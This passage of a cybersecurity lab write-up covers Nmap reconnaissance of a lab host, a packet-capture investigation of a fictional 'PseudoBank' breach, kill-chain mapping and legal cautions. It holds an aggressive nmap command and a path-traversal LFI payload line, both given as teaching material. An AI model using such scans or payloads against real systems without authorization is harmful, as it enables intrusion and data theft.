- ✗ **Legal:** Unauthorized scanning may be illegal

**Use Case:**
- Penetration testing
- Security audits
- Red team engagements
- Vulnerability assessment

---

#### Scan 5: Detailed Single Host Analysis

**Target:** 192.168.252.42 (Specific high-value target)

**Scan Profile:** Intense scan (focused)

**Nmap Command:**
```bash
nmap -T4 -A -v 192.168.252.42
```

**Screenshot References:**
- Figure 14: Initial scan output
- Figure 15: Service details and OS detection
- Figure 16: Traceroute and final results

---

**Comprehensive Host Profile (192.168.252.42):**

**Open Ports & Services:**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6
443/tcp  open  ssl/http    Apache httpd 2.4.6
8080/tcp open  http-proxy  
```

**Service Details:**
- **SSH:**
  - Version: OpenSSH 7.4
  - Key fingerprints captured
  - Supported algorithms identified
  - Potential vulnerabilities cross-referenced

- **HTTP/HTTPS:**
  - Server: Apache 2.4.6 (CentOS)
  - Title: "PseudoBank Login" (hypothetical)
  - Directory structure enumerated
  - SSL certificate details extracted

**Operating System Detection:**
```
OS Detection:
├─ OS: Linux 3.10 - 4.11
├─ Distribution: CentOS 7.x / RHEL 7.x
├─ Kernel: 3.10.0-xxx
└─ Confidence: 95%
```

**Network Details:**
```
Network Distance: 1 hop (direct connection)
MAC Address: XX:XX:XX:XX:XX:XX
MAC Vendor: VMware, Inc. (virtual machine)
```

**NSE Script Results (Nmap Scripting Engine):**
```
Scripts executed:
├─ http-title: Retrieved page titles
├─ http-methods: Identified allowed HTTP methods
├─ ssl-cert: Extracted SSL certificate
├─ ssh-hostkey: Captured SSH keys
└─ http-robots.txt: Checked for robots.txt
```

**Traceroute:**
```
HOP RTT     ADDRESS
1   0.89 ms 192.168.252.42
```
(Direct connection, no intermediate routers)

---

**Security Assessment for 192.168.252.42:**

**Vulnerabilities Identified:**
1. **Apache 2.4.6:** Known CVEs (check CVE database)
2. **OpenSSH 7.4:** Potential weak algorithms (from Lab 3)
3. **Port 8080 exposed:** Development/proxy service accessible
4. **Directory listing:** Possible information disclosure

**Attack Surface:**
- 4 open ports = 4 potential entry points
- Web application(s) running
- Administrative access via SSH
- Proxy service purpose unclear (investigation needed)

**Recommended Actions:**
1. Vulnerability scan with OpenVAS (as in Lab 3)
2. Web application security testing
3. SSH hardening (disable weak ciphers)
4. Review necessity of port 8080 exposure
5. Implement host-based firewall rules

---

### Scanning Best Practices Demonstrated

**Legal & Ethical Considerations:**
- ✅ Authorized scanning of lab environment
- ✅ Controlled network (no production impact)
- ✅ Documentation of scan activities
- ⚠️ Real-world: Always obtain written authorization

**Operational Best Practices:**
- ✅ Progressive scanning (ping → quick → intense)
- ✅ Timing consideration (-T4 appropriate for internal)
- ✅ Comprehensive data collection (-A aggressive scan)
- ✅ Documentation of findings (screenshots, reports)
- ✅ Result validation (cross-reference multiple scans)

**Technical Best Practices:**
- ✅ Multiple scan types for complete picture
- ✅ Service version detection for vulnerability correlation
- ✅ OS fingerprinting for attack planning
- ✅ Network topology mapping for lateral movement planning
- ✅ Stealth techniques when appropriate (-sS)

---

## 💡 Skills Demonstrated

### Technical Skills

**Packet Analysis & Forensics:**
- ✅ PCAP file analysis using Wireshark
- ✅ HTTP traffic decoding and reconstruction
- ✅ Session tracking across multiple packets
- ✅ Credential extraction from network traffic
- ✅ Timeline reconstruction from packet metadata
- ✅ Attack pattern identification
- ✅ Evidence correlation and analysis

**Network Reconnaissance:**
- ✅ Nmap command-line proficiency
- ✅ Zenmap GUI utilization
- ✅ Host discovery techniques (ping scanning)
- ✅ Port scanning methodologies (SYN, connect, service scans)
- ✅ Service version detection
- ✅ Operating system fingerprinting
- ✅ Network topology mapping
- ✅ Stealth scanning techniques

**Incident Response:**
- ✅ Attack vector identification (LFI)
- ✅ Incident timeline creation
- ✅ Impact assessment (financial, data exposure)
- ✅ Root cause analysis
- ✅ Remediation planning
- ✅ Evidence preservation
- ✅ Executive summary creation

**Security Analysis:**
- ✅ Web application vulnerability assessment
- ✅ Attack chain reconstruction
- ✅ Risk prioritization
- ✅ Defense-in-depth evaluation
- ✅ Security control gap identification

### Professional Competencies

**Communication:**
- ✅ Technical incident reporting
- ✅ Executive-level summary writing
- ✅ Remediation recommendations
- ✅ Clear documentation of findings
- ✅ Stakeholder communication (customer notification)

**Critical Thinking:**
- ✅ Pattern recognition in network traffic
- ✅ Correlation of disparate data points
- ✅ Logical attack chain inference
- ✅ Systematic investigation methodology
- ✅ Hypothesis-driven analysis

**Business Acumen:**
- ✅ Financial impact quantification
- ✅ Regulatory compliance awareness (PCI-DSS, GLBA)
- ✅ Risk-based prioritization
- ✅ Cost-benefit analysis of controls
- ✅ Reputational impact consideration

---

## 🌐 Real-World Applications

### Digital Forensics & Incident Response

**Scenario 1: Data Breach Investigation**

**Application of Lab Skills:**
1. **PCAP Analysis:** Examine firewall/IDS packet captures
2. **Timeline Creation:** Reconstruct attacker activities
3. **Evidence Collection:** Document all findings for legal proceedings
4. **Impact Assessment:** Determine scope of data exposure

**Real Tools:**
- Wireshark/TShark (packet analysis)
- NetworkMiner (forensic packet extraction)
- Zeek/Bro (network security monitoring)
- Moloch (packet capture indexing)

**Job Roles:**
- Incident Response Analyst
- Digital Forensics Investigator
- SOC Analyst (Tier 2/3)
- Cyber Threat Intelligence Analyst

---

**Scenario 2: Financial Fraud Investigation**

**PseudoBank Incident Type:** Exactly what financial institutions face daily

**Investigation Process:**
```
1. Alert Trigger: Unusual transaction detected
2. PCAP Collection: Retrieve network traffic for timeframe
3. Session Analysis: Track attacker's activities
4. Credential Tracking: Identify compromised accounts
5. Fund Flow: Trace unauthorized transfers
6. Evidence Package: Prepare for law enforcement
```

**Industry Standards:**
- **PCI-DSS Requirement 10:** Log all access to cardholder data
- **GLBA:** Financial privacy protection
- **SOX:** Internal control over financial reporting

**Career Path:** Financial Services Security Analyst, Banking Security Operations

---

### Penetration Testing & Red Team Operations

**Scenario 3: Web Application Penetration Test**

**Lab Skills → Pen Test Workflow:**

**Phase 1: Reconnaissance (Nmap from Lab)**
```
└─ Host discovery: Identify targets
└─ Port scanning: Find services
└─ Service enumeration: Version detection
└─ OS fingerprinting: Attack customization
```

**Phase 2: Vulnerability Identification (OpenVAS from Lab 3)**
```
└─ Automated scanning
└─ Manual testing
└─ Exploit research
```

**Phase 3: Exploitation (LFI from Lab 4)**
```
└─ LFI exploitation
└─ Credential harvesting
└─ Privilege escalation
└─ Lateral movement
```

**Phase 4: Post-Exploitation**
```
└─ Data exfiltration (as demonstrated in incident)
└─ Persistence
└─ Cleanup
```

**Phase 5: Reporting**
```
└─ Executive summary (as created in lab)
└─ Technical findings
└─ Remediation guidance
```

**Certifications Aligned:**
- OSCP (Offensive Security Certified Professional)
- CEH (Certified Ethical Hacker)
- GPEN (GIAC Penetration Tester)

---

### Security Operations Center (SOC)

**Scenario 4: 24/7 Security Monitoring**

**Alert: Suspicious Network Traffic**

**SOC Analyst Workflow (Using Lab Skills):**

**Tier 1: Initial Triage**
```
1. Review IDS/IPS alert
2. Check source/destination IPs
3. Identify affected systems (Nmap scanning)
4. Escalate if necessary
```

**Tier 2: Investigation (Lab Skills)**
```
1. PCAP analysis (Wireshark)
2. Identify attack type (LFI, SQLi, XSS, etc.)
3. Determine scope of compromise
4. Timeline reconstruction
5. IOC (Indicators of Compromise) extraction
```

**Tier 3: Incident Response**
```
1. Containment actions
2. Evidence preservation
3. Root cause analysis
4. Remediation coordination
5. Lesson learned documentation
```

**Tools Integration:**
- SIEM: Splunk, QRadar, ELK Stack
- IDS/IPS: Snort, Suricata
- PCAP Storage: Moloch, Arkime
- Threat Intelligence: MISP, ThreatConnect

---

### Vulnerability Management

**Scenario 5: Continuous Security Assessment**

**Quarterly VM Process:**

**Week 1: Discovery (Nmap)**
```
└─ Asset inventory update
└─ New host identification
└─ Service enumeration
└─ Shadow IT detection
```

**Week 2: Scanning (OpenVAS from Lab 3)**
```
└─ Vulnerability identification
└─ CVSS scoring
└─ Risk prioritization
```

**Week 3: Analysis (Wireshark + Nmap)**
```
└─ Validate findings
└─ Identify attack paths
└─ Assess exploitability
```

**Week 4: Remediation & Reporting**
```
└─ Patch deployment
└─ Configuration hardening
└─ Rescan verification
└─ Executive reporting
```

**Compliance Mapping:**
- PCI-DSS Req. 11.2: Quarterly vulnerability scans
- NIST 800-53 RA-5: Vulnerability scanning
- ISO 27001 A.12.6.1: Technical vulnerability management

---

### Career Paths Enabled by Lab Skills

| Role | Lab Skills Applied | Salary Range (USD) |
|------|-------------------|-------------------|
| **SOC Analyst** | PCAP analysis, incident triage | $60k - $90k |
| **Incident Responder** | Forensics, timeline reconstruction | $80k - $120k |
| **Penetration Tester** | Nmap, exploitation, reporting | $90k - $140k |
| **Vulnerability Analyst** | Scanning, assessment, remediation | $70k - $110k |
| **Digital Forensics** | PCAP analysis, evidence collection | $75k - $115k |
| **Security Engineer** | Scanning, hardening, architecture | $100k - $150k |
| **CISO/Director** | Risk assessment, executive reporting | $150k - $300k+ |

---

## 📚 Key Learnings

### 1. The Power of Packet Analysis

**Network Traffic = Complete Truth:**

Unlike logs (which can be tampered with), packet captures provide:
- ✓ Unalterable evidence of network activity
- ✓ Complete visibility into communications
- ✓ Ability to see what attackers saw
- ✓ Credential and data extraction capability

**PseudoBank Incident Lesson:**
```
Without PCAP: "We think there was a breach"
With PCAP: "Attacker at 10.10.10.66 stole $504 via LFI 
            at packet 1164, using credentials from 
            source.php, on August 22, 2011 at 12:18 PM"
```

**Critical Insight:** Packet capture = Time machine for security incidents

**Implementation:**
- Deploy full packet capture at network perimeter
- Retain PCAPs for minimum 30 days (90+ for compliance)
- Index PCAPs for rapid search (Moloch/Arkime)
- Practice regular analysis (build muscle memory)

---

### 2. Encryption is Non-Negotiable

**HTTP vs. HTTPS Impact:**

**Attacker Visibility with HTTP (PseudoBank):**
```
✓ Usernames and passwords (plaintext)
✓ Session tokens
✓ Account balances
✓ Transaction details
✓ Personal information
✓ Database queries
✓ Source code (via LFI)
```

**Attacker Visibility with HTTPS:**
```
✗ Encrypted blob (unreadable without private key)
✓ Source/destination IPs (metadata only)
✓ Connection timing
```

**Real Statistics:**
- 95% of web traffic is HTTPS in 2024
- Google ranks HTTPS sites higher in search
- Browsers mark HTTP sites as "Not Secure"
- Let's Encrypt provides free TLS certificates

**Lesson:** HTTPS isn't optional - it's fundamental

---

### 3. Defense in Depth Failure Analysis

**Single Point of Failure - LFI:**

```
Layer 1: Network Security
├─ Firewall: ✓ Allowed web traffic (necessary)
└─ IDS: ✗ No detection of LFI attempts

Layer 2: Application Security
├─ Input Validation: ✗ FAILED - allowed path traversal
├─ WAF: ✗ Not deployed
└─ Error Handling: ✗ Revealed file structure

Layer 3: Access Control
├─ File Permissions: ✗ Source code web-accessible
├─ Least Privilege: ✗ Database creds hardcoded
└─ Authentication: ✗ Session hijacking possible

Layer 4: Data Protection
├─ Encryption in Transit: ✗ HTTP (plaintext)
├─ Encryption at Rest: ✗ Unknown
└─ Data Masking: ✗ Account info fully visible

Layer 5: Monitoring & Response
├─ Logging: ✗ Insufficient
├─ Alerting: ✗ No unusual activity detection
└─ Incident Response: ✗ Breach undetected
```

**Result:** Single vulnerability (LFI) led to complete system compromise

**Proper Defense in Depth:**
```
Even with LFI:
├─ HTTPS would prevent credential sniffing
├─ Secure session management would prevent hijacking
├─ Database encryption would protect stolen credentials
├─ Transaction limits would reduce theft amount
├─ Alerting would detect unusual account access
└─ WAF might have blocked LFI attempts
```

**Principle:** No single security control should be a single point of failure

---

### 4. The Attack Kill Chain

**Cyber Kill Chain (Lockheed Martin Model):**

**PseudoBank Incident Mapped:**
```
1. Reconnaissance
   └─ Attacker scans bob.pseudovision.net
   └─ Lab Skill: Nmap scanning

2. Weaponization
   └─ Crafts LFI payload: ?page=../../../../source.php
   └─ Lab Skill: Web application testing

3. Delivery
   └─ Sends HTTP request with malicious parameter
   └─ Lab Skill: PCAP analysis (observed in packet 1164)

4. Exploitation
   └─ LFI vulnerability triggered
   └─ source.php contents disclosed
   └─ Lab Skill: Attack pattern recognition

5. Installation
   └─ Not applicable (web-based attack, no malware)
   └─ Alternative: Session hijacking

6. Command & Control
   └─ Attacker uses stolen credentials for persistent access
   └─ Lab Skill: Session tracking in Wireshark

7. Actions on Objectives
   └─ $504 theft from Tara's account
   └─ Data exfiltration (account enumeration)
   └─ Lab Skill: Impact assessment
```

**Defensive Opportunities at Each Stage:**
```
Reconnaissance → Rate limiting, honeypots
Weaponization → Threat intelligence
Delivery → WAF, input validation
Exploitation → Vulnerability management
Installation → Endpoint protection
C2 → Network segmentation, egress filtering
Actions → Data loss prevention, transaction monitoring
```

**Key Insight:** Earlier detection = less damage

---

### 5. Network Reconnaissance Methodology

**Systematic Scanning Approach:**

**Progressive Scanning (Lab Workflow):**
```
Phase 1: Ping Scan (-sn)
└─ Discover: Which hosts are alive?
└─ Fast, non-intrusive
└─ Creates target list for deeper scans

Phase 2: Quick Scan (-F)
└─ Scan: Top 100 common ports
└─ Rapid service identification
└─ Prioritize high-value targets

Phase 3: Full Scan
└─ Scan: All 65535 ports (or specific range)
└─ Comprehensive coverage
└─ Identifies non-standard services

Phase 4: Intense Scan (-A)
└─ Deep dive: OS detection, version info, scripts
└─ Attack surface mapping
└─ Vulnerability correlation
```

**Why This Matters:**

**Bad Approach:**
```
nmap -A -p- 10.0.0.0/8
└─ Scans 16 million hosts, all ports, full detection
└─ Takes weeks/months
└─ Triggers every IDS
└─ Overwhelms scanner
```

**Good Approach (Lab Method):**
```
1. Ping scan subnet (minutes)
2. Quick scan discovered hosts (hours)
3. Intense scan priority targets (hours)
4. Full scan specific systems (days)
```

**Result:** Complete network map in hours instead of weeks

---

### 6. Ethical and Legal Considerations

**Critical Reminder:** Unauthorized scanning is illegal in most jurisdictions.

**Legal Framework:**

**United States:**
- **Computer Fraud and Abuse Act (CFAA):** Unauthorized access is a federal crime
- **State Laws:** Many states have additional computer crime statutes
- **Penalties:** Fines up to $250,000 and 10+ years imprisonment

**Other Countries:**
- **UK:** Computer Misuse Act 1990
- **EU:** Various national laws + GDPR considerations
- **Canada:** Criminal Code Section 342.1

**Safe Scanning:**
```
✅ Own equipment
✅ Lab environments
✅ Authorized penetration tests (written approval)
✅ Bug bounty programs (within scope)
✅ Academic environments with permission
```

**Unsafe Scanning:**
```
✗ Internet-wide scans without authorization
✗ Corporate networks without explicit permission
✗ "Testing" website security without asking
✗ Scanning to find vulnerabilities to sell
```

**Professional Standard:**
- Always get written authorization
- Define scope clearly (IPs, dates, techniques)
- Respect boundaries
- Report findings responsibly
- Maintain confidentiality

---

### 7. Documentation is Critical

**Why Lab Documentation Matters:**

**Incident Response:**
- Evidence for legal proceedings
- Timeline for root cause analysis
- Remediation tracking
- Lessons learned

**Penetration Testing:**
- Reproducible findings
- Client deliverable
- Proof of exploitation
- Remediation verification

**Vulnerability Management:**
- Audit trail
- Compliance evidence
- Trend analysis
- SLA tracking

**Lab Best Practice:**
```
Every scan/analysis should have:
├─ Date and time
├─ Tools and versions used
├─ Commands executed
├─ Complete output (screenshots, logs)
├─ Analysis and findings
└─ Recommendations
```

**Professional Habit:** Document as you go, not after the fact

---
